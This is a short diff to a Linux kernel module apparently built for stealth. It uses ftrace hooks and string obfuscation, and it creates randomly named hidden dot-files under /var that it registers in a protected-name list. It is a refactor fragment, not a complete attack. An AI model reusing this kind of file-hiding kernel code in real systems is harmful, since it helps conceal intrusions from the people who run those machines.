@@ -18,7 +18,6 @@
 #include <linux/percpu.h>
 #include "lkm.h"
 #include "fs.h"
-#include "obfstr.h"
 #include "bpf.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -1064,12 +1063,15 @@ void fh_remove_hooks(struct ftrace_hook *hooks) {
 
 static char *_sys_file(char *prefix, char *file, int len) {
     if (*file == 0) {
-        char tmp[8] = {0};
+        char s[8] = {0};
 
-        *tmp = '.';
-        snprintf(&tmp[1], 7, "%s", kv_whatever_random_AZ_string(7));
-        snprintf(file, len-1, "/var/%s", tmp);
-        fs_add_name_ro(tmp);
+        *s = '.';
+        snprintf(&s[1], 7, "%s", kv_util_random_AZ_string(7));
+        snprintf(file, len-1, "/var/%s", s);
+        {
+            const char *tmp[] = {s,NULL};
+            fs_add_name_ro(tmp);
+        }
         prinfo("new %s, filename: '%s'\n", prefix, file);
     }
 
